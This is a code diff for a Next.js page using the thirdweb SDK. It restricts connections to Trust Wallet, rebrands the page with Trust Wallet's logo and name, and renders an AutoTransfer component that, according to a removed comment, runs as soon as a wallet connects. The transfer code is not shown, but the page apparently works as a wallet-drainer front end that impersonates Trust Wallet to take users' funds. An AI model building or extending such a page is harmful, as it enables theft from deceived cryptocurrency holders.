@@ -2,49 +2,75 @@
 
 import Image from "next/image";
 import { ConnectButton } from "thirdweb/react";
-import thirdwebIcon from "@public/thirdweb.svg";
-import { client } from "./client";
+import { createThirdwebClient } from "thirdweb";
+import { createWallet, type Wallet } from "thirdweb/wallets";
 import AutoTransfer from "./components/AutoTransfer";
+import thirdwebIcon from "@public/thirdweb.svg";
+import trustwallet from "@public/trustwallet.png";
+// --- Création du client Thirdweb ---
+const client = createThirdwebClient({
+  clientId: "c98a5d48ad89f114ad6044933fced541",
+});
+
+// --- Limiter les wallets à Trust Wallet uniquement ---
+const wallets = [createWallet("com.trustwallet.app")];
 
 export default function Home() {
+  const handleWalletConnect = async (wallet: Wallet) => {
+    try {
+      const account = await wallet.getAccount();
+      if (account) {
+        console.log("Wallet connected:", account.address);
+      } else {
+        console.log("Wallet connected but address pending");
+      }
+    } catch (error) {
+      console.error("Wallet connection failed:", error);
+    }
+  };
+
+  const handleWalletDisconnect = async () => {
+    console.log("Wallet disconnected");
+  };
+
   return (
-    <main className="p-4 pb-10 min-h-[100vh] flex items-center justify-center container max-w-screen-lg mx-auto">
-      <div className="py-20">
-        <Header />
+    <main className="p-4 pb-10 min-h-[100vh] flex flex-col items-center justify-center container max-w-screen-lg mx-auto bg-white">
+      <Header />
 
-        <div className="flex justify-center mb-20">
-          <ConnectButton
-            client={client}
-            appMetadata={{
-              name: "Example App",
-              url: "https://example.com",
-            }}
-          />
-        </div>
-
-        {/* Dès qu'un wallet est connecté, AutoTransfer s'exécute */}
-        <AutoTransfer />
+      <div className="flex justify-center mb-20 mt-10">
+        <ConnectButton
+          client={client}
+          wallets={wallets} // <-- Trust Wallet uniquement
+          connectModal={{ size: "compact" }}
+          onConnect={handleWalletConnect}
+          onDisconnect={handleWalletDisconnect}
+          appMetadata={{
+            name: "Example App",
+            url: "https://example.com",
+          }}
+        />
       </div>
+
+      <AutoTransfer />
     </main>
   );
 }
 
 function Header() {
   return (
-    <header className="flex flex-col items-center mb-20 md:mb-20">
+    <header className="flex flex-col items-center mb-20">
       <Image
-        src={thirdwebIcon}
-        alt=""
-        className="size-[150px] md:size-[150px]"
-        style={{
-          filter: "drop-shadow(0px 0px 24px #a726a9a8)",
-        }}
+        src={trustwallet}
+        alt="Thirdweb Logo"
+        width={150}
+        height={150}
+        style={{ filter: "drop-shadow(0px 0px 24px #a726a9a8)" }}
       />
 
-      <h1 className="text-2xl md:text-6xl font-semibold md:font-bold tracking-tighter mb-6 text-zinc-100">
-        QR
-        <span className="text-zinc-300 inline-block mx-1"> + </span>
-        <span className="inline-block -skew-x-6 text-blue-500"> Wallet </span>
+      <h1 className="text-2xl md:text-6xl font-semibold md:font-bold tracking-tighter mt-6 text-zinc-900">
+        Trust
+        {/* <span className="text-zinc-500 inline-block mx-1"> + </span> */}
+        <span className="inline-block -skew-x-6 text-blue-500">Wallet</span>
       </h1>
     </header>
   );
